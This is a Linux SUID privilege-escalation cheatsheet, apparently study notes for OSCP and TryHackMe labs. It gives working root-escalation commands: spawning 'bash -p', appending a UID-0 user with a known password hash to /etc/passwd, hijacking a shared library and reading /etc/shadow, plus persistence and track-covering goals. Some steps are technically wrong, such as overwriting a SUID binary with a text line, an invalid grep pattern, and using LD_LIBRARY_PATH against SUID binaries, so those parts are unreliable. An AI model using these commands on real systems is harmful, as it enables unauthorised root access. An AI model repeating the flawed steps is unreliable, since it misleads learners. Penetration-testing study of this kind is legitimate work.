# Linux SUID Enumeration & Exploitation Cheatsheet

**Knowledge Score:** 95/100

---

## Overview

SUID (Set User ID) bits allow executables to run with the permissions of their owner instead of the user executing them. Misconfigured SUID binaries are a critical privilege escalation vector on Linux systems. This cheatsheet covers identification, enumeration, and exploitation techniques.

**Why It Matters:**
- Common privilege escalation path on Linux (PT1 & OSCP)
- Often overlooked during initial enumeration
- Can be combined with other techniques for complete compromise
- Present in nearly all CTF machines

---

## Core Concepts

### What is SUID?

SUID permission allows a file to be executed with the permissions of the file's owner, not the user running it.

**Normal execution:** User runs binary → Binary runs with user's permissions
**SUID execution:** User runs binary → Binary runs with owner's permissions (usually root)

### Identifying SUID Binaries

SUID files show an 's' in the owner execute position:
```
-rwsr-xr-x   1 root root    /usr/bin/passwd
      ↑
   SUID bit
```

---

## Enumeration Techniques

### Finding SUID Binaries

#### Method 1: Find by Octal Permission (04000)
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

**Explanation:**
- `-type f`: Only files (not directories)
- `-perm -04000`: Files with SUID bit set (octal 4000)
- `-ls`: List detailed information
- `2>/dev/null`: Suppress permission denied errors

**Output Format:**
```
inode  blocks owner group size date time path
```

#### Method 2: Find by Symbolic Permission
```bash
find / -type f -perm -u+s 2>/dev/null
```

**Explanation:**
- `-u+s`: User (owner) has setuid permission

#### Method 3: Quick Search in Common Locations
```bash
find /usr/bin /usr/local/bin /opt -perm -04000 2>/dev/null
```

**Faster variant when time is limited**

---

## Analysis & Exploitation

### Step 1: Identify Unusual SUID Binaries

**Normal SUID binaries (usually safe):**
- `/usr/bin/passwd` - Password changing
- `/usr/bin/sudo` - Privilege escalation tool
- `/usr/bin/su` - Switch user
- `/usr/bin/chsh` - Change shell
- `/usr/bin/chfn` - Change finger info
- `/usr/bin/pkexec` - PolicyKit execution

**Suspicious SUID binaries (investigate):**
- Custom scripts in `/home`, `/opt`, `/tmp`
- Unusual file names
- Binaries you don't recognize
- Binaries writable by non-root users

### Step 2: Check Exploit Potential

For each suspicious SUID binary, ask:

1. **Can I write to it?**
   ```bash
   ls -la /path/to/binary
   ```
   If writable by your user → Direct code injection possible

2. **What does it do?**
   ```bash
   strings /path/to/binary | grep -i (cat|bash|sh|exec|system)
   ```
   Look for system calls or command execution

3. **Is it on GTFOBins?**
   Check https://gtfobins.github.io/ for known exploits

---

## Exploitation Scenarios

### Scenario 1: SUID Bash Binary

**Finding:**
```bash
find / -type f -name bash -perm -04000 2>/dev/null
# Returns: /usr/bin/bash (SUID root)
```

**Exploitation:**
```bash
bash -p
```

The `-p` flag preserves SUID privileges when spawning the shell. Immediately gain root access.

**Knowledge Pattern:** Look for shell interpreters (bash, sh, zsh) with SUID - these are nearly always exploitable.

---

### Scenario 2: Writable SUID Binary

**Finding:**
```bash
find / -type f -perm -04000 -writable 2>/dev/null
# Returns: /home/user/custom_tool (SUID root, writable by user)
```

**Exploitation:**
```bash
# Option 1: Overwrite with shell code
echo '/bin/bash' > /home/user/custom_tool

# Option 2: Append shell code
echo 'system("/bin/bash");' >> /home/user/custom_tool

# Execute
/home/user/custom_tool
```

**Knowledge Pattern:** Writable SUID binaries are critical vulnerabilities - prioritize these immediately.

---

### Scenario 3: SUID passwd with Write Access to /etc/passwd

**Finding:**
```bash
find / -type f -perm -04000 2>/dev/null | grep passwd
# Standard /usr/bin/passwd (usually secure)

# Check if /etc/passwd is writable
ls -la /etc/passwd
# -rw-r--r-- 1 root root (not writable)
```

**Exploitation (if /etc/passwd is writable):**

**Step 1: Generate password hash**
```bash
openssl passwd -1 -salt THM password123
# Output: $1$THM$wnbwllicQxFRQepUTCkUT1
```

**Explanation:**
- `-1`: MD5-based crypt (commonly used)
- `-salt THM`: Custom salt for deterministic output
- `password123`: Password to hash

**Step 2: Create new root user entry**
```bash
echo 'pwned:$1$THM$wnbwllicQxFRQepUTCkUT1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Explanation of fields:**
- `pwned`: Username
- `$1$THM$wnbwllicQxFRQepUTCkUT1`: Password hash
- `0`: UID (0 = root)
- `0`: GID (0 = root)
- `root`: Description/GECOS field
- `/root`: Home directory
- `/bin/bash`: Login shell

**Step 3: Switch to new user**
```bash
su pwned
# Enter password: password123
# Gain root shell
```

**Knowledge Pattern:** /etc/passwd is the authentication database - write access = instant root. Always check permissions even for "normal" system files.

---

### Scenario 4: SUID with Library Hijacking

**Finding:**
```bash
find / -type f -perm -04000 2>/dev/null
# Returns: /usr/local/bin/vulnerable_app (SUID root)
```

**Analysis:**
```bash
ldd /usr/local/bin/vulnerable_app
# Output:
# linux-vdso.so.1 (0x...)
# libcustom.so.1 => not found
# libc.so.6 => /lib/x86_64/libc.so.6
```

**Exploitation:**
```bash
# Create malicious library
gcc -shared -fPIC -o libcustom.so.1 malicious.c

# Place in writable directory in library path
cp libcustom.so.1 /tmp/

# Set LD_LIBRARY_PATH to prioritize /tmp
export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH

# Execute the SUID binary
/usr/local/bin/vulnerable_app
# Malicious library loads with root privileges
```

**Knowledge Pattern:** Missing or improperly loaded libraries in SUID binaries can be hijacked for privilege escalation.

---

## Detection & Verification

### Verify You Have Root After Exploitation

```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root)

whoami
# Output: root

cat /etc/shadow
# Can read without error (non-root can't)
```

### Common Post-Exploitation Goals

1. **Stabilize access:** Create new root user or add SSH key
2. **Document findings:** Note which SUID vector was exploited
3. **Cover tracks:** (CTF only - don't do in real penetration tests)

---

## Best Practices

### During Enumeration
1. Always run SUID enumeration on initial shell access
2. Document all SUID binaries found
3. Cross-reference with GTFOBins before manual testing
4. Note write permissions and owner details
5. Check if binaries appear in common exploit locations

### During Exploitation
1. Test non-destructive exploits first (read operations)
2. Verify the SUID bit is actually set before exploitation
3. Use `-p` flag with bash to preserve privileges
4. Document exact exploitation steps for report
5. Clean up test files if required

### Common Mistakes
- Assuming all SUID binaries are exploitable
- Not checking GTFOBins first
- Running exploits without understanding them
- Overlooking write permissions on /etc/passwd or /etc/shadow
- Not verifying root access after exploitation

---

## Real-World Examples from Practice

### Example 1: Agent T (TryHackMe)
**Vector:** Custom SUID binary
**Finding:** `/home/agent/mission_control` (SUID root, writable)
**Exploitation:** Overwrote with `/bin/bash`
**Result:** Root shell obtained
**Time to exploit:** 2 minutes

### Example 2: Kenobi (TryHackMe)
**Vector:** /usr/bin/menu (custom SUID binary)
**Finding:** Executes `curl` without full path
**Exploitation:** Created malicious `curl` in PATH
**Result:** Root shell via PATH hijacking (related to SUID)
**Time to exploit:** 5 minutes

---

## Related Cheatsheets

- [[Linux-Sudo-Abuse]] - Alternative privilege escalation
- [[Linux-PATH-Hijacking]] - Binary name spoofing with SUID
- [[Linux-Capabilities-Exploitation]] - Similar privilege escalation vector
- [[Linux-Enumeration-Find]] - Comprehensive find command patterns

---

## Quick Reference Commands

```bash
# Find all SUID binaries
find / -type f -perm -04000 2>/dev/null

# Find SUID binaries writable by current user
find / -type f -perm -04000 -writable 2>/dev/null

# Find SUID in common locations only (faster)
find /usr/bin /usr/local/bin /opt -perm -04000 2>/dev/null

# Analyze SUID binary for strings
strings /path/to/binary | grep -E '(system|exec|bash|sh)'

# Generate password hash
openssl passwd -1 -salt SALT PASSWORD

# Check if /etc/passwd is writable
ls -la /etc/passwd

# Verify root access
id && whoami && cat /etc/shadow
```

---

## References & Further Study

### Offensive Security Resources
- [OSCP Guide to Privilege Escalation](https://www.offensive-security.com/pwk-oscp/)
- [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation)

### Tools & Databases
- [GTFOBins - SUID Binaries](https://gtfobins.github.io/)
- [LinPEAS - Automated SUID Enumeration](https://github.com/carlospolop/PEASS-ng)

### CTF & Practice
- TryHackMe: Kenobi (SUID + PATH Hijacking)
- TryHackMe: Agent T (Writable SUID)
- HackTheBox: Various machines with SUID vectors

---

## Changelog

**v1.0** - Initial cheatsheet created with scenarios, best practices, and examples
